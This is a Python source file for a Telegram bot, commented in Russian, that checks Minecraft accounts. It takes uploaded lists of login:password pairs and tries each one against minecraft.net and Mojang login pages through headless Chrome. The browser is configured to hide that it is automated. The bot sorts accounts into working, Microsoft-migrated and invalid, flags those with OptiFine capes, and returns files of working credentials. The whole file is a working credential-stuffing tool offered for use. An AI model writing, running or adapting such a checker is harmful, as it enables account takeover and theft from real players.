import os
import logging
import asyncio
import aiofiles
import time
import random
from datetime import datetime
from typing import Dict, List, Tuple
import re

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, CallbackQueryHandler

from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.chrome.service import Service
from selenium.common.exceptions import TimeoutException, NoSuchElementException, WebDriverException

import requests

# Настройка логирования
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Конфиг
TOKEN = os.environ.get('BOT_TOKEN')
ADMIN_IDS = os.environ.get('ADMIN_IDS', '').split(',')
ADMIN_IDS = [int(id.strip()) for id in ADMIN_IDS if id.strip()]
ALLOWED_USERS = ADMIN_IDS.copy() if ADMIN_IDS else []

# Статистика
bot_stats = {
    'total': 0,
    'valid': 0,
    'invalid': 0,
    'capes': 0,
    'migrated': 0,
    'start_time': datetime.now()
}

class AccountChecker:
    """Проверка аккаунтов Minecraft"""
    
    def __init__(self):
        self.driver = None
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
    
    def setup_driver(self):
        """Настройка Chrome для быстрой работы"""
        chrome_options = Options()
        
        # Оптимизация для скорости
        chrome_options.add_argument('--headless=new')
        chrome_options.add_argument('--no-sandbox')
        chrome_options.add_argument('--disable-dev-shm-usage')
        chrome_options.add_argument('--disable-gpu')
        chrome_options.add_argument('--window-size=1280,720')
        chrome_options.add_argument('--disable-blink-features=AutomationControlled')
        chrome_options.add_argument('--ignore-certificate-errors')
        
        # Отключаем загрузку картинок для скорости
        chrome_options.add_argument('--blink-settings=imagesEnabled=false')
        
        # Маскировка
        chrome_options.add_argument('--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36')
        
        chrome_options.add_experimental_option('excludeSwitches', ['enable-automation'])
        chrome_options.add_experimental_option('useAutomationExtension', False)
        
        # Путь к ChromeDriver
        chromedriver_path = '/usr/local/bin/chromedriver'
        if not os.path.exists(chromedriver_path):
            chromedriver_path = '/usr/bin/chromedriver'
        
        try:
            service = Service(chromedriver_path)
            self.driver = webdriver.Chrome(service=service, options=chrome_options)
            self.driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
            return True
        except Exception as e:
            logger.error(f"Ошибка запуска Chrome: {e}")
            return False
    
    async def check_account(self, login: str, password: str) -> Dict:
        """Быстрая проверка аккаунта"""
        
        if not self.driver:
            if not self.setup_driver():
                return {
                    'login': login,
                    'status': 'error',
                    'error': 'Chrome не запустился'
                }
        
        try:
            # 1. Сначала проверяем через прямой API Microsoft (быстро)
            ms_check = await self.check_microsoft_api(login, password)
            if ms_check['status'] == 'microsoft':
                return ms_check
            
            # 2. Если не Microsoft, пробуем через сайт
            result = await self.check_via_site(login, password)
            return result
            
        except WebDriverException:
            # Перезапускаем Chrome если упал
            self.close()
            if self.setup_driver():
                return await self.check_account(login, password)
            return {
                'login': login,
                'status': 'error',
                'error': 'Chrome упал'
            }
    
    async def check_microsoft_api(self, login: str, password: str) -> Dict:
        """Проверка через API Microsoft (очень быстро)"""
        try:
            # Проверяем, похоже ли на Microsoft аккаунт
            if '@' in login and any(domain in login.lower() for domain in ['outlook', 'hotmail', 'live', 'microsoft']):
                return {
                    'login': login,
                    'password': password,
                    'status': 'migrated',
                    'error': 'Microsoft (email)'
                }
            
            # Пробуем получить ник через API Mojang (если аккаунт старый)
            if re.match(r'^[a-zA-Z0-9_]{2,16}$', login):
                # Это похоже на ник, проверяем через API
                response = self.session.get(f"https://api.mojang.com/users/profiles/minecraft/{login}", timeout=3)
                if response.status_code == 200:
                    # Аккаунт существует, но нужен пароль
                    pass
                    
            return {'status': 'unknown'}
            
        except Exception as e:
            logger.debug(f"API ошибка: {e}")
            return {'status': 'unknown'}
    
    async def check_via_site(self, login: str, password: str) -> Dict:
        """Проверка через сайт Minecraft"""
        
        try:
            # Пробуем разные URL для входа
            login_urls = [
                'https://www.minecraft.net/en-us/login',
                'https://account.mojang.com/login'
            ]
            
            for url in login_urls:
                self.driver.get(url)
                
                # Ждем загрузку (максимум 5 секунд)
                WebDriverWait(self.driver, 5).until(
                    EC.presence_of_element_located((By.TAG_NAME, "body"))
                )
                
                # Проверяем Microsoft редирект
                if 'login.live.com' in self.driver.current_url:
                    return {
                        'login': login,
                        'password': password,
                        'status': 'migrated',
                        'error': 'Microsoft'
                    }
                
                # Ищем форму входа
                try:
                    # Поле email/логин
                    email_selectors = [
                        "input[type='email']",
                        "input[name='email']",
                        "input[type='text']",
                        "#email",
                        "#username"
                    ]
                    
                    email_input = None
                    for selector in email_selectors:
                        try:
                            email_input = self.driver.find_element(By.CSS_SELECTOR, selector)
                            break
                        except:
                            continue
                    
                    if not email_input:
                        continue
                    
                    # Поле пароля
                    password_input = self.driver.find_element(By.CSS_SELECTOR, "input[type='password']")
                    
                    # Кнопка входа
                    submit_button = self.driver.find_element(By.CSS_SELECTOR, "button[type='submit'], input[type='submit']")
                    
                    # Вводим данные
                    email_input.clear()
                    email_input.send_keys(login)
                    
                    password_input.clear()
                    password_input.send_keys(password)
                    
                    # Отправляем
                    submit_button.click()
                    
                    # Ждем результат (3 секунды)
                    time.sleep(2)
                    
                    # Проверяем результат
                    current_url = self.driver.current_url
                    page_source = self.driver.page_source.lower()
                    
                    # Успешный вход
                    if any(x in current_url for x in ['dashboard', 'profile', 'minecraft.net', 'msa']):
                        # Получаем ник
                        username = await self.extract_username()
                        
                        # Проверяем плащ
                        has_cape = await self.check_optifine_cape(username)
                        
                        return {
                            'login': login,
                            'password': password,
                            'username': username,
                            'status': 'valid',
                            'has_cape': has_cape
                        }
                    
                    # Microsoft редирект
                    if 'login.live.com' in current_url or 'microsoft' in page_source:
                        return {
                            'login': login,
                            'password': password,
                            'status': 'migrated',
                            'error': 'Microsoft'
                        }
                    
                    # Ошибка входа
                    if 'error' in page_source or 'invalid' in page_source:
                        return {
                            'login': login,
                            'status': 'invalid',
                            'error': 'Неверный логин/пароль'
                        }
                    
                except NoSuchElementException:
                    continue
            
            return {
                'login': login,
                'status': 'invalid',
                'error': 'Не удалось проверить'
            }
            
        except TimeoutException:
            return {
                'login': login,
                'status': 'error',
                'error': 'Таймаут'
            }
        except Exception as e:
            logger.error(f"Ошибка: {e}")
            return {
                'login': login,
                'status': 'error',
                'error': str(e)[:50]
            }
    
    async def extract_username(self) -> str:
        """Извлекает ник пользователя"""
        try:
            # Пробуем разные селекторы
            selectors = [
                ".profile-name",
                ".username",
                "[data-username]",
                ".gamertag",
                ".user-info span"
            ]
            
            for selector in selectors:
                try:
                    elements = self.driver.find_elements(By.CSS_SELECTOR, selector)
                    for el in elements:
                        if el.text and 2 < len(el.text) < 20:
                            return el.text.strip()
                except:
                    pass
            
            # Пробуем через JavaScript
            username = self.driver.execute_script("""
                return localStorage.getItem('username') || 
                       localStorage.getItem('user') || 
                       document.cookie.match(/user=([^;]+)/)?.[1] ||
                       'unknown';
            """)
            
            return username or "unknown"
        except:
            return "unknown"
    
    async def check_optifine_cape(self, username: str) -> bool:
        """Быстрая проверка плаща"""
        if not username or username == 'unknown':
            return False
        
        try:
            # Прямой запрос к Optifine
            response = self.session.get(
                f"https://optifine.net/capes/{username}.png",
                timeout=2,
                stream=True
            )
            
            if response.status_code == 200:
                size = len(response.content)
                if size > 500:  # Нормальный плащ
                    logger.info(f"🔥 Найден плащ у {username}")
                    return True
            return False
        except:
            return False
    
    def close(self):
        """Закрытие Chrome"""
        if self.driver:
            try:
                self.driver.quit()
            except:
                pass
            self.driver = None

# Создаем экземпляр
checker = AccountChecker()

async def process_file(file_path, update, context):
    """Обработка файла"""
    results = {
        'valid': [],
        'capes': [],
        'invalid': [],
        'migrated': [],
        'errors': []
    }
    
    msg = await update.message.reply_text(
        "🚀 **Запускаю быструю проверку...**\n"
        "⏳ Это займет 1-2 минуты"
    )
    
    try:
        # Читаем файл
        async with aiofiles.open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            content = await f.read()
        
        # Парсим аккаунты
        lines = content.strip().split('\n')
        accounts = []
        
        for line in lines:
            line = line.strip()
            if not line:
                continue
            
            # Пробуем разные разделители
            for sep in [':', ';', '|', '\t']:
                if sep in line:
                    parts = line.split(sep, 1)
                    if len(parts) == 2 and parts[0] and parts[1]:
                        accounts.append((parts[0].strip(), parts[1].strip()))
                        break
        
        total = len(accounts)
        
        if total == 0:
            await msg.edit_text("❌ **Нет аккаунтов в файле**")
            return
        
        await msg.edit_text(
            f"📥 **Файл:** {update.message.document.file_name}\n"
            f"📊 **Аккаунтов:** {total}\n\n"
            f"🔄 **Проверяю...**"
        )
        
        start_time = time.time()
        
        # Проверяем каждый аккаунт
        for i, (login, password) in enumerate(accounts, 1):
            # Обновляем прогресс
            if i % 5 == 0 or i == total:
                elapsed = time.time() - start_time
                await msg.edit_text(
                    f"📊 **Прогресс:** {i}/{total}\n"
                    f"🔥 **Плащей:** {len(results['capes'])}\n"
                    f"✅ **Рабочих:** {len(results['valid'])}\n"
                    f"⏱ **Время:** {elapsed:.1f}с\n\n"
                    f"🔄 **Проверяю:** {login[:15]}..."
                )
            
            # Проверка
            result = await checker.check_account(login, password)
            
            # Сортируем
            if result['status'] == 'valid':
                results['valid'].append(result)
                if result.get('has_cape'):
                    results['capes'].append(result)
                    bot_stats['capes'] += 1
                bot_stats['valid'] += 1
            elif result['status'] == 'migrated':
                results['migrated'].append(result)
                bot_stats['migrated'] += 1
            elif result['status'] == 'invalid':
                results['invalid'].append(result)
                bot_stats['invalid'] += 1
            else:
                results['errors'].append(result)
                bot_stats['invalid'] += 1
            
            bot_stats['total'] += 1
            
            # Минимальная задержка
            await asyncio.sleep(1)
        
        # Сохраняем результаты
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        
        # Файл с плащами
        if results['capes']:
            cape_file = f"🔥_ПЛАЩИ_{len(results['capes'])}шт_{timestamp}.txt"
            async with aiofiles.open(cape_file, 'w', encoding='utf-8') as f:
                await f.write("🔥 АККАУНТЫ С ПЛАЩАМИ OPTIFINE 🔥\n\n")
                for acc in results['capes']:
                    await f.write(
                        f"Логин: {acc['login']}\n"
                        f"Пароль: {acc['password']}\n"
                        f"Ник: {acc.get('username', 'неизвестно')}\n"
                        f"{'='*40}\n\n"
                    )
            
            with open(cape_file, 'rb') as f:
                await update.message.reply_document(
                    document=f,
                    filename=cape_file,
                    caption=f"🔥 **Плащей: {len(results['capes'])}**"
                )
            os.remove(cape_file)
        
        # Файл с валидными
        if results['valid']:
            valid_file = f"✅_РАБОЧИЕ_{len(results['valid'])}шт_{timestamp}.txt"
            async with aiofiles.open(valid_file, 'w', encoding='utf-8') as f:
                for acc in results['valid']:
                    await f.write(f"{acc['login']}:{acc['password']}\n")
            
            with open(valid_file, 'rb') as f:
                await update.message.reply_document(
                    document=f,
                    filename=valid_file,
                    caption=f"✅ **Рабочих: {len(results['valid'])}**"
                )
            os.remove(valid_file)
        
        # Файл с Microsoft
        if results['migrated']:
            ms_file = f"🔄_MICROSOFT_{len(results['migrated'])}шт_{timestamp}.txt"
            async with aiofiles.open(ms_file, 'w', encoding='utf-8') as f:
                for acc in results['migrated']:
                    await f.write(f"{acc['login']}:{acc['password']}\n")
            
            with open(ms_file, 'rb') as f:
                await update.message.reply_document(
                    document=f,
                    filename=ms_file,
                    caption=f"🔄 **Microsoft: {len(results['migrated'])}**"
                )
            os.remove(ms_file)
        
        # Итог
        elapsed = time.time() - start_time
        minutes = int(elapsed // 60)
        seconds = int(elapsed % 60)
        
        await update.message.reply_text(
            f"✅ **ПРОВЕРКА ЗАВЕРШЕНА!**\n\n"
            f"📊 **Статистика:**\n"
            f"• Всего: {total}\n"
            f"• ✅ Рабочих: {len(results['valid'])}\n"
            f"• 🔥 С плащами: {len(results['capes'])}\n"
            f"• ❌ Неверных: {len(results['invalid'])}\n"
            f"• 🔄 Microsoft: {len(results['migrated'])}\n"
            f"• ⚠️ Ошибок: {len(results['errors'])}\n\n"
            f"⏱ **Время:** {minutes}м {seconds}с"
        )
        
    except Exception as e:
        logger.error(f"Ошибка: {e}")
        await update.message.reply_text(f"❌ **Ошибка:** {str(e)[:100]}")
    finally:
        if os.path.exists(file_path):
            os.remove(file_path)

# Команды
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Старт"""
    if ALLOWED_USERS and update.effective_user.id not in ALLOWED_USERS:
        await update.message.reply_text("❌ **Нет доступа**")
        return
    
    uptime = datetime.now() - bot_stats['start_time']
    hours = int(uptime.seconds // 3600)
    minutes = int((uptime.seconds // 60) % 60)
    
    keyboard = [
        [InlineKeyboardButton("📊 Стата", callback_data='stats')],
        [InlineKeyboardButton("❓ Помощь", callback_data='help')]
    ]
    
    await update.message.reply_text(
        f"👋 **Minecraft Account Checker**\n\n"
        f"🔍 **Быстрая проверка аккаунтов**\n\n"
        f"📥 **Отправь .txt файл**\n"
        f"с логин:пароль\n\n"
        f"📊 **Статистика:**\n"
        f"• Проверено: {bot_stats['total']}\n"
        f"• Найдено плащей: {bot_stats['capes']}\n\n"
        f"⏱ **Работаю:** {hours}ч {minutes}мин",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Кнопки"""
    query = update.callback_query
    await query.answer()
    
    if query.data == 'stats':
        uptime = datetime.now() - bot_stats['start_time']
        hours = int(uptime.seconds // 3600)
        minutes = int((uptime.seconds // 60) % 60)
        
        await query.edit_message_text(
            f"📊 **СТАТИСТИКА**\n\n"
            f"Всего: {bot_stats['total']}\n"
            f"✅ Рабочих: {bot_stats['valid']}\n"
            f"❌ Битых: {bot_stats['invalid']}\n"
            f"🔥 С плащами: {bot_stats['capes']}\n"
            f"🔄 Microsoft: {bot_stats['migrated']}\n\n"
            f"⏱ Аптайм: {hours}ч {minutes}мин"
        )
    
    elif query.data == 'help':
        await query.edit_message_text(
            "❓ **КАК ПОЛЬЗОВАТЬСЯ**\n\n"
            "1️⃣ Создай .txt файл\n"
            "2️⃣ В каждой строке: логин:пароль\n"
            "3️⃣ Отправь файл боту\n\n"
            "📌 **Пример:**\n"
            "`user@gmail.com:pass123`\n"
            "`Steve:123456`\n\n"
            "⚡️ **Быстрая проверка:**\n"
            "• Microsoft аккаунты определяются сразу\n"
            "• Плащи проверяются в 2 этапа\n"
            "• На 100 аккаунтов ~ 2-3 минуты"
        )

async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Получение файла"""
    if ALLOWED_USERS and update.effective_user.id not in ALLOWED_USERS:
        await update.message.reply_text("❌ **Нет доступа**")
        return
    
    doc = update.message.document
    
    if not doc.file_name.endswith('.txt'):
        await update.message.reply_text("❌ **Нужен .txt файл**")
        return
    
    if doc.file_size > 10 * 1024 * 1024:
        await update.message.reply_text(f"❌ **Файл > 10 МБ** ({doc.file_size / 1024 / 1024:.1f} МБ)")
        return
    
    try:
        await update.message.reply_text(
            f"📥 **Файл получен:** {doc.file_name}\n"
            f"📦 **Размер:** {doc.file_size / 1024:.1f} КБ\n\n"
            f"🔄 **Начинаю проверку...**"
        )
        
        file = await context.bot.get_file(doc.file_id)
        path = f"temp_{update.effective_user.id}_{doc.file_name}"
        await file.download_to_drive(path)
        await process_file(path, update, context)
    except Exception as e:
        logger.error(f"Ошибка: {e}")
        await update.message.reply_text(f"❌ **Ошибка:** {str(e)[:100]}")

def main():
    """Запуск"""
    if not TOKEN:
        print("❌ НЕТ ТОКЕНА!")
        return
    
    print("=" * 50)
    print("🚀 ЗАПУСК ACCOUNT CHECKER")
    print("=" * 50)
    
    app = Application.builder().token(TOKEN).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(button_callback))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
    
    print("✅ БОТ РАБОТАЕТ!")
    
    try:
        app.run_polling()
    finally:
        checker.close()

if __name__ == '__main__':
    main()